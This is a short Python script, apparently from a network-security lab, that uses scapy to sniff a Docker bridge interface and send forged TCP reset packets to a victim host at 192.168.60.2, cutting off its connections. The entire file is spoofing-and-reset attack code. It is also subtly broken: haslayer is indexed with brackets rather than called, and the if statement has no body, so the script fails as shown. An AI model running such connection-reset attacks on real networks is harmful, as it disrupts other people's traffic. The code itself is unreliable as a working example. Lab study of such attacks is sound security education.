from scapy.all import TCP, IP, send, sniff

def packet_extract(packet):
    victim_ip = packet[IP].src
    user1_ip = packet[IP].dst
    victim_port = packet[TCP].sport
    user1_port = packet[TCP].dport
    acknowledge = packet[TCP].ack
    sequence = packet[TCP].seq

    if packet.haslayer[TCP] and victim_ip == '192.168.60.2':

    reset_ip = IP(src = user1_ip, dst = victim_ip)
    reset_tcp = TCP(sport = user1_port,
                    dport = victim_port,
                    flags = 'R',
                    seq = acknowledge)
    reset_packet = reset_ip / reset_tcp
    reset_packet.show()
    send(reset_packet, verbose = 0)

sniff(iface = 'br-b63fe27dcce0', prn = packet_extract)